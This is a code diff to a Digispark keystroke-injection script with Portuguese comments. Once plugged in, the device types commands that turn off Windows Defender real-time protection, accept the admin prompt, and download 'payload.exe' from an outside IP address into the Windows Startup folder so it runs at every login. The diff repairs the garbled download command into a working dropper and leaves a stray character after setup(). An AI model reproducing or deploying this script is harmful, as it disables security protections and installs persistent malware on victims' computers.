@@ -31,8 +31,13 @@ void printText(fstr_t *txt) {
   DigiKeyboard.update();
 }
 
+ 
+
 void setup() {
   digiBegin();
+
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
 
   ///desabilitar windows defender
   DigiKeyboard.delay(1000);
@@ -42,9 +47,10 @@ void setup() {
   printText(F("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
+  
   // se você precisar de administrador [esquerda, digite e atrase 1000]
   DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
-  DigiKeyboard.delay(1000); desti
+  DigiKeyboard.delay(1000); 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
@@ -56,10 +62,8 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   // Altere esse valor dependendo do computador que você está usando (ou seja, lento ou não)
   DigiKeyboard.delay(900);
-  printText(F("powershell $source = 'http://34.97.212.80/payload.exerpowershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
-
-              r'; $destination = '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Spowershell $startup\\__.exe'; Invoke-WebRequest $source -OutFile $destination;"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(900);
@@ -73,8 +77,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT);
   digiEnd();
 }
-
+d
 /* Unused endless loop */
 void loop() {}
-
-
